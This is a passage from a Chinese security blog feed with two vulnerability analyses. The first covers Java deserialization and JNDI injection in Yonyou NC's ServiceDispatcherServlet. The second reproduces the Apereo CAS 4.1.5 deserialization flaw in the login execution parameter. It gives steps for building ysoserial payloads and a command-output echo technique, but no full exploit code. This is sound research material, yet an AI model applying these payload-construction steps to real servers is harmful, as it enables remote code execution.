alt="1592152447890"></p><p>执行getInstance(),获取NCLocator的实例，并执行实例的lookup方法。</p><p><img src="/images/YonyouNc/1592203909575.png" alt="1592203909575"></p><p>跟进<code>nc.bs.framework.common.NCLocator#getInstance(java.util.Properties)</code></p><p><img src="/images/YonyouNc/1592204019467.png" alt="1592204019467"></p><p>刚启动的时候locatorMap为空，则会在下面的判断分支中，创建RmiNCLocator实例并将该实例存放到locatorMap中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">locator = (NCLocator)locatorMap.get(key);</span><br><span class="line">        <span class="keyword">if</span> (locator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> locator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isEmpty(locatorProvider)) &#123;</span><br><span class="line">                locator = newInstance(locatorProvider);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isEmpty(svcDispatchURL)) &#123;</span><br><span class="line">                locator = newInstance(<span class="string">"nc.bs.framework.rmi.RmiNCLocator"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                locator = getDefaultLocator();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            locator.init(props);</span><br><span class="line">            locatorMap.put(key, locator);</span><br><span class="line">            <span class="keyword">return</span> locator;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>获取到RmiNCLocator实例后，跟进到lookup方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nc.bs.framework.rmi.RmiNCLocator#lookup</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> ComponentException </span>&#123;</span><br><span class="line">        Object result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = <span class="keyword">this</span>.remoteContext.lookup(name);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> FrameworkRuntimeException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (FrameworkRuntimeException)var4;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ComponentException(name, <span class="string">"Component resolve exception "</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>this.remoteContext.lookup(name);</code>,继续跟进：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nc.bs.framework.rmi.RemoteContextStub#lookup</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Object so = <span class="keyword">this</span>.proxyMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (so != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> so;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ComponentMetaVO metaVO = <span class="keyword">this</span>.getMetaOnDemand(name);</span><br><span class="line">            <span class="keyword">if</span> (metaVO == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ComponentNotFoundException(name, <span class="string">"no remote componnet found from server"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                so = <span class="keyword">this</span>.proxyMap.get(metaVO.getName());</span><br><span class="line">                <span class="keyword">if</span> (so != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> so;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    RemoteAddressSelector ras = <span class="keyword">new</span> GroupBasedRemoteAddressSelector(<span class="keyword">this</span>.getRealTarget(metaVO), <span class="keyword">this</span>.getServerGroup(metaVO));</span><br><span class="line">                    so = RemoteProxyFactory.getDefault().createRemoteProxy(RemoteContextStub<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">metaVO</span>, <span class="title">ras</span>)</span>;</span><br><span class="line">                    <span class="keyword">this</span>.proxyMap.put(metaVO.getName(), so);</span><br><span class="line">                    <span class="keyword">return</span> so;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到先从proxyMap中查看是否存在参数name的方法，如果存在则直接返回，不存在则进入另外的分支。因为这里我是刚启动的，所以该方法是不存在的，也可以直接将so赋值为null，进去到下面的分支去看看具体的执行流程。</p><p><img src="/images/YonyouNc/1592209159419.png" alt="1592209159419"></p><p>跟进<code>nc.bs.framework.rmi.RemoteContextStub#getMetaOnDemand</code>,又可以看到调用了<code>this.remoteMetaContext.lookup(name);</code>方法，这个变量remoteMetaContext是<code>nc.bs.framework.server.RemoteMetaContext</code>类，那么这个类是怎么来的呢？</p><p><img src="/images/YonyouNc/1592209487982.png" alt="1592209487982"></p><p>因为当前的类为<code>nc.bs.framework.rmi.RemoteContextStub#RemoteContextStub</code>，这里可以回到类构造函数，第65行创建了一个代理，并赋值到<code>this.remoteMetaContext</code>：</p><p><img src="/images/YonyouNc/1592212049147.png" alt="1592212049147"></p><p>了解过java代理的应该知道，不管用户调用代理对象的任何方法，该方法都会调用处理器的invoke方法，这里即是<code>nc.bs.framework.rmi.RemoteInvocationHandler#invoke</code>。不懂的可以先看<a href="https://www.cnblogs.com/xdp-gacl/p/3971367.html" target="_blank" rel="noopener">这里</a>。</p><p><img src="/images/YonyouNc/1592217600559.png" alt="1592217600559"></p><p>那么现在回到上面，跟进<code>this.remoteMetaContext.lookup(name);</code>，果然进入到了invoke方法。经过一番判断</p><p>执行this.sendRequest(method, args)方法。</p><p><img src="/images/YonyouNc/1592218223159.png" alt="1592218223159"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nc.bs.framework.rmi.RemoteInvocationHandler#sendRequest(java.lang.reflect.Method, java.lang.Object[])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">sendRequest</span><span class="params">(Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        InvocationInfo ii = <span class="keyword">this</span>.newInvocationInfo(method, args);</span><br><span class="line">        Address old = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> retry = <span class="number">0</span>;</span><br><span class="line">        ConnectorFailException error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            Address target = <span class="keyword">this</span>.ras.select();</span><br><span class="line">            <span class="keyword">if</span> (old != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Logger.error(<span class="string">"connect to: "</span> + old + <span class="string">" failed, now retry connect to: "</span> + target);</span><br><span class="line">                <span class="keyword">if</span> (old.equals(target)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="keyword">this</span>.retryInterval);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.restoreToken(ii, target);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Object var8 = <span class="keyword">this</span>.sendRequest(target, ii, method, args);</span><br><span class="line">                <span class="keyword">return</span> var8;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ConnectorFailException var14) &#123;</span><br><span class="line">                ++retry;</span><br><span class="line">                old = target;</span><br><span class="line">                error = var14;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.storeToken(ii, target);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span>(retry &lt; <span class="keyword">this</span>.retryMax);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> error;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>this.sendRequest(target, ii, method, args);</code>,在第182行将ii序列化输出，发送到<code>http://server:port/ServiceDispatcherServlet</code>，并获取服务端返回的结果反序列化，回显到客户端。</p><p><img src="/images/YonyouNc/1592219243047.png" alt="1592219243047"></p><p><img src="/images/YonyouNc/1592219210083.png" alt="1592219210083"></p><p>到此客户端的处理流程大致分析完成，看到这里大家可能有会对上面客户端将类序列化发往服务端，那服务端肯定要反序列化呀，会不会有问题？别急，继续往下看。</p><h3 id="2-服务端分析"><a href="#2-服务端分析" class="headerlink" title="2.服务端分析"></a>2.服务端分析</h3><p>先来分析jndi注入的形成</p><p>在<code>nc.bs.framework.comn.serv.CommonServletDispatcher#doPost</code>第38行下断点。</p><p><img src="/images/YonyouNc/1592236432591.png" alt="1592236432591"></p><p>跟进<code>this.rmiHandler.handle(new HttpRMIContext(request, response));</code>,跟进后在第85行继续跟进<code>this.doHandle(rmiCtx);</code>。</p><p><img src="/images/YonyouNc/1592236486535.png" alt="1592236486535"></p><p>在第153行出现处理客户端提交内容的，继续跟进：</p><p><img src="/images/YonyouNc/1592236605328.png" alt="1592236605328"></p><p>在第282行可以看到直接将输入流的内容反序列化了，代码执行过程中完全没有任何的过滤，确实存在触发反序列化漏洞，这里先不管，继续往下。</p><p><img src="/images/YonyouNc/1592236746588.png" alt="1592236746588"></p><p>这里注意的是第286行将反序列化后的类赋予到抽象类<code>nc.bs.framework.rmi.server.AbstractRMIContext#invInfo</code>的invInfo变量里，这个变量在下面用到。</p><p><img src="/images/YonyouNc/1592220689757.png" alt="1592220689757"></p><p>回到刚才的第二个断点，跟进<code>result.result = this.invokeBeanMethod(rmiCtx);</code>,这里第333行就是上面说到的invinfo变量，实际就是反序列化后的类。</p><p>这里有两个分支，不管是哪个都存在jndi注入，因为这里lookup的参数service是可控的，所以必然存在漏洞。</p><p><img src="/images/YonyouNc/1592320624956.png" alt="1592320624956"></p><h3 id="3-效果演示"><a href="#3-效果演示" class="headerlink" title="3.效果演示"></a>3.效果演示</h3><p>这里就不给poc了，如果看懂了上面的过程其实也不难，实际就是构造一个InvocationInfo类，并将servicename的值设置为远程恶意类，序列化后发送到服务端触发jndi注入即可。</p><p><img src="/images/YonyouNc/1592322620367.png" alt="1592322620367"></p><p><img src="/images/YonyouNc/image-20200617093259154.png" alt="image-20200617093259154"></p><p><img src="/images/YonyouNc/1592323482077.png" alt="1592323482077"></p><h3 id="4-前面的反序列化"><a href="#4-前面的反序列化" class="headerlink" title="4.前面的反序列化"></a>4.前面的反序列化</h3><p>上面发现的反序列化根本都没有过滤的，为啥还要这么麻烦要jndi注入呢，直接反序列化不香嘛？看了web的依赖环境，commons-collections3.2，那不是现成的利用嘛。</p><p><img src="/images/YonyouNc/image-20200617105253981.png" alt="image-20200617105253981"></p><p>直接ysoserial生成恶意类发送，弹计算器。</p><p><img src="/images/YonyouNc/1592236873117.png" alt="1592236873117"></p><p>整个调用栈如下:</p><p><img src="/images/YonyouNc/image-20200617105315331.png" alt="image-20200617105315331"></p><p>注：在NCCloud 1909的版本中该依赖包为较新版，此利用链不可用。</p><h2 id="0X02-最后说几句"><a href="#0X02-最后说几句" class="headerlink" title="0X02 最后说几句"></a>0X02 最后说几句</h2><p>漏洞过程并不是太复杂，应该不难理解的。实际上，用友NC系统多处存在未过滤的反序列化漏洞，不过由于新版NC将依赖版本更新了，yso的大多数利用链都不能使用了,因此需要重新寻找新的利用链。</p><h2 id="0X03参考链接"><a href="#0X03参考链接" class="headerlink" title="0X03参考链接"></a>0X03参考链接</h2><ul><li><a href="https://mp.weixin.qq.com/s/eF1v4iYE4T_NqmztM3i6TA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eF1v4iYE4T_NqmztM3i6TA</a> </li><li><a href="https://nosec.org/home/detail/4472.html" target="_blank" rel="noopener">https://nosec.org/home/detail/4472.html</a></li><li><a href="https://www.cnblogs.com/Java-Script/p/11089314.html" target="_blank" rel="noopener">https://www.cnblogs.com/Java-Script/p/11089314.html</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></li><li><a href="https://www.cnblogs.com/xdp-gacl/p/3971367.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/3971367.html</a></li><li><a href="https://www.anquanke.com/post/id/208726" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208726</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NC用友远程命令执行漏洞分析&quot;&gt;&lt;a href=&quot;#NC用友远程命令执行漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;NC用友远程命令执行漏洞分析&quot;&gt;&lt;/a&gt;NC用友远程命令执行漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apereo CAS 4.X反序列化漏洞分析及复现</title>
    <link href="https://drea1v1.github.io/2020/02/03/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <id>https://drea1v1.github.io/2020/02/03/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-02-03T08:01:17.000Z</published>
    <updated>2020-02-04T04:48:56.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>放假前看到很多文章对这个漏洞进行分析复现，又因为过年期间的特殊情况，实在是无聊至极，所以自己也来学习一下，顺便恶补一下反序列化漏洞的知识。这篇文章记录了自己的一些想法以及相关的知识点，方便自己日后忘记可以重新拾起。第一次写文章有不好的，希望大家见谅。</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>由于部分cas版本的加密函数不同有相应的变化，因此想要按照此文章来复现漏洞的话还是选择和我一样的版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdk8u144(不一定完全一样)</span><br><span class="line">ApereoCas-4.1.5</span><br></pre></td></tr></table></figure><hr><blockquote><p>下载CAS-Overlay-Template</p></blockquote><p>github链接(<a href="https://github.com/apereo/cas-overlay-template/tree/4.1" target="_blank" rel="noopener">https://github.com/apereo/cas-overlay-template/tree/4.1</a>)</p><p>github上有详细的部署操作，这里要注意要修改pom.xml文件cas的版本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;cas.version&gt;4.1.5&lt;&#x2F;cas.version&gt;</span><br></pre></td></tr></table></figure><p>编译完后，会在target目录生成一个cas.war的war包，将该war包放在tomcat的web目录上，启动tomcat即可通过<a href="http://localhost/cas" target="_blank" rel="noopener">http://localhost/cas</a>访问example。</p><p>成功部署后：<br><img src="/images/ApereoCas/1.jpg" alt="image"></p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>该漏洞存在于登录的execution参数，抓包发现该参数值应该是加密过的，故要知道对应的加密方法以及处理过程才行。</p><p><img src="/images/ApereoCas/2.jpg" alt="image"></p><blockquote><p>web.xml</p></blockquote><p>查看登录url对应的servlet可知道交给了Spring的DispatcherServlet处理了，配置文件为/WEB-INF/cas-servlet.xml<br><img src="/images/ApereoCas/3.jpg" alt="image"></p><p>从springmvc的执行流程图(网上找的)可以知道只要找到对应的处理器适配器，就能找到对应的处理器。<br><img src="/images/ApereoCas/4.jpg" alt="image"></p><blockquote><p>cas-servlet.xml</p></blockquote><p>全局搜索login字眼，看到loginHandlerAdapter适配器，处理器的类名为org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter</p><p><img src="/images/ApereoCas/5.jpg" alt="image"></p><p>org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter该类继承FlowHandlerAdapter类，登录时调用继承类的handler方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;org.springframework.webflow.mvc.servlet.FlowHandlerAdapter#handle</span><br><span class="line"></span><br><span class="line">public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        FlowHandler flowHandler &#x3D; (FlowHandler)handler;</span><br><span class="line">        this.checkAndPrepare(request, response, false);</span><br><span class="line">        String flowExecutionKey &#x3D; this.flowUrlHandler.getFlowExecutionKey(request);</span><br><span class="line">        if (flowExecutionKey !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                ServletExternalContext context &#x3D; this.createServletExternalContext(request, response);</span><br><span class="line">                FlowExecutionResult result &#x3D; this.flowExecutor.resumeExecution(flowExecutionKey, context);</span><br><span class="line">                this.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br><span class="line">            &#125; catch (FlowException var11) &#123;</span><br><span class="line">                this.handleFlowException(var11, request, response, flowHandler);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                String flowId &#x3D; this.getFlowId(flowHandler, request);</span><br><span class="line">                MutableAttributeMap&lt;Object&gt; input &#x3D; this.getInputMap(flowHandler, request);</span><br><span class="line">                ServletExternalContext context &#x3D; this.createServletExternalContext(request, response);</span><br><span class="line">                FlowExecutionResult result &#x3D; this.flowExecutor.launchExecution(flowId, input, context);</span><br><span class="line">                this.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br><span class="line">            &#125; catch (FlowException var10) &#123;</span><br><span class="line">                this.handleFlowException(var10, request, response, flowHandler);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中flowExecutionKey通过getFlowExecutionKey方法获取参数execution的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String flowExecutionKey &#x3D; this.flowUrlHandler.getFlowExecutionKey(request);</span><br></pre></td></tr></table></figure><p>flowExecutionKey作为参数传入resumeExecution方法，跟进函数。在第91行对flowExecutionKey值的格式进行判断，通过”-“分割字符串为两部分uuid以及base64编码flowstate，因此格式不满足的话是无法继续走下去的。</p><p><img src="/images/ApereoCas/6.jpg" alt="image"></p><p><img src="/images/ApereoCas/7.jpg" alt="image"></p><p>跟进第96行getFlowExecution。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public FlowExecution getFlowExecution(FlowExecutionKey key) throws FlowExecutionRepositoryException &#123;</span><br><span class="line">        if (!(key instanceof ClientFlowExecutionKey)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Expected instance of ClientFlowExecutionKey but got &quot; + key.getClass().getName());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            byte[] encoded &#x3D; ((ClientFlowExecutionKey)key).getData();</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state &#x3D; (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded);</span><br><span class="line">                FlowDefinition flow &#x3D; this.flowDefinitionLocator.getFlowDefinition(state.getFlowId());</span><br><span class="line">                return this.flowExecutionFactory.restoreFlowExecution(state.getExecution(), flow, key, state.getConversationScope(), this.flowDefinitionLocator);</span><br><span class="line">            &#125; catch (IOException var5) &#123;</span><br><span class="line">                throw new ClientFlowExecutionRepositoryException(&quot;Error decoding flow execution&quot;, var5);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在第105行对之前base64解码后的encoded进行解密，跟进解密函数this.transcoder.decode(encoded)</p><p><img src="/images/ApereoCas/8.jpg" alt="image"></p><p><img src="/images/ApereoCas/9.jpg" alt="image"></p><p>可以看出在第83行对密文进行解密，经过一系列的操作后在99行进行反序列化，触发漏洞。可以看出调用的decode方法属于EncryptedTranscoder类，该类还定义的加密方法encode，这里可以直接生成恶意对象，直接调用org.jasig.spring.webflow.plugin.EncryptedTranscoder#encode生成加密字节数组后base64，加上”uuid-“构成execution的值。</p><blockquote><p>整个调用栈</p></blockquote><p><img src="/images/ApereoCas/10.jpg" alt="image"></p><h1 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h1><p>默认环境的jar包中有commons-collections4-4.0.jar，直接使用ysoserial生成payload,这里记得要将payload的特殊符号进行url编码。</p><p><img src="/images/ApereoCas/11.jpg" alt="image"></p><p><img src="/images/ApereoCas/12.jpg" alt="image"></p><blockquote><p>演示结果</p></blockquote><p>成功执行系统命令<br><img src="/images/ApereoCas/13.jpg" alt="image"></p><h1 id="0x04-构造回显payload"><a href="#0x04-构造回显payload" class="headerlink" title="0x04 构造回显payload"></a>0x04 构造回显payload</h1><p>看了大佬的<a href="https://www.00theway.org/2020/01/04/apereo-cas-rce/" target="_blank" rel="noopener">分析</a>，知道可以回显，文章提及到org.springframework.webflow.context.ExternalContextHolder.getExternalContext()方法可以获取到上下文关联信息，然后通过getNativeRequest()方法获取request对象通过getNativeResponse()方法获取response对象。同时提及到org.springframework.cglib.core.ReflectUtils.defineClass().newInstance();加载payload。我的猜测大佬的想法是通过defineClass从byte[]还原出一个Class对象，该恶意对象主要是执行命令，获取response对象，将执行命令后的结果通过response对象的输出流输出。在利用commons-collections1是发现ReflectUtils利用不了，因为构造方法为private，要设置setAccessible为true。因此使用commons-collections2的话，实际就不需要这么麻烦用defineClass来加载payload了，直接在利用类里面写就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;org.springframework.cglib.core.ReflectUtils</span><br><span class="line">private ReflectUtils() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;org.springframework.cglib.core.ReflectUtils#defineClass</span><br><span class="line"></span><br><span class="line"> public static Class defineClass(String className, byte[] b, ClassLoader loader) throws Exception &#123;</span><br><span class="line">        Object[] args &#x3D; new Object[]&#123;className, b, new Integer(0), new Integer(b.length), PROTECTION_DOMAIN&#125;;</span><br><span class="line">        Class c &#x3D; (Class)DEFINE_CLASS.invoke(loader, args);</span><br><span class="line">        Class.forName(className, true, loader);</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里看看ysoserial的commons-collections2的构造恶意对象的主要方法。这里使用javassist,第66行获取要操作的类，第75行在该类的构造方法中插入代码,因此这里只要修改该类ysoserial.payloads.util.Gadgets.StubTransletPayload的构造方法为执行系统命令，并修改response的输出流。大家可以直接修改ysoserial的源码并重新编译，我这里为了方便直接用了网上的payload改了一下。</p><p><img src="/images/ApereoCas/14.jpg" alt="image"></p><p><img src="/images/ApereoCas/15.jpg" alt="image"></p><blockquote><p>演示结果</p></blockquote><p><img src="/images/ApereoCas/16.jpg" alt="image"></p><h1 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h1><p>文章中存在错误的地方希望大佬们斧正，多多指点。通过这次的分析，其实学到很多东西的，包括commons-collections利用链、ysoserial(这个工具，也是边看别人的分析，边看的源码，不然一脸懵逼)。最后，在新的一年里希望大家身体健康，万事如意。</p><h1 id="0x05参考链接："><a href="#0x05参考链接：" class="headerlink" title="0x05参考链接："></a>0x05参考链接：</h1><p><a href="https://www.00theway.org/2020/01/04/apereo-cas-rce/" target="_blank" rel="noopener">https://www.00theway.org/2020/01/04/apereo-cas-rce/</a></p><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041</a></p><p><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></p><p><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031</a></p><p><a href="https://xz.aliyun.com/t/7032" target="_blank" rel="noopener">https://xz.aliyun.com/t/7032</a></p><p><a href="http://www.vuln.cn/6295" target="_blank" rel="noopener">http://www.vuln.cn/6295</a></p><p><a href="https://www.freebuf.com/vuls/170344.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/170344.html</a></p><p><a href="https://mp.weixin.qq.com/s/FSMNIkVws3eqDdaheiCviA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/FSMNIkVws3eqDdaheiCviA</a></p><p><a href="https://www.cnblogs.com/gxc6/p/9544563.html" target="_blank" rel="noopener">https://www.cnblogs.com/gxc6/p/9544563.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;放假前看到很多文章对这个漏洞进行分析复现，又因为过年期间的特殊情况，实在是无聊至极，所以自己也来学习
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="https://drea1v1.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
